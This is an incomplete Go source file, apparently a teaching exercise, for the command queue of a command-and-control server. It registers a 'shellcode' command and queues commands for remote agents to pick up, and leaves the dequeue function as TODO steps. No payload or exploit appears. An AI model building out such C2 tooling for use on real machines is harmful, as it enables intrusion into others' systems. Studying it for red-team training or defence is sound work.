package control

import (
	"encoding/json"
	"log"
	"sync"
)

// CommandValidator validates command-specific arguments
type CommandValidator func(json.RawMessage) error

// CommandProcessor processes command-specific arguments
type CommandProcessor func(json.RawMessage) (json.RawMessage, error)

// Registry of valid commands with their validators and processors
var validCommands = map[string]struct {
	Validator CommandValidator
	Processor CommandProcessor
}{
	"shellcode": {
		Validator: validateShellcodeCommand,
		Processor: processShellcodeCommand,
	},
}

// CommandQueue stores commands ready for agent pickup
type CommandQueue struct {
	PendingCommands []CommandClient
	mu              sync.Mutex
}

// AgentCommands is the global command queue
var AgentCommands = CommandQueue{

	PendingCommands: make([]CommandClient, 0),
}

// addCommand adds a validated command to the queue
func (cq *CommandQueue) addCommand(command CommandClient) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	cq.PendingCommands = append(cq.PendingCommands, command)
	log.Printf("QUEUED: %s", command.Command)
}

// GetCommand retrieves and removes the next command from queue
func (cq *CommandQueue) GetCommand() (CommandClient, bool) {
	// TODO: lock mutex + defer unlock
	// TODO: check if cq.PendingCommands is empty

	// TODO: assign cmd equal to index 0 in cq.PendingCommands
	// TODO: use [1:] to remove first element

	// TODO: print confirmation command was dequeued

	// TODO: return cmd and true

}
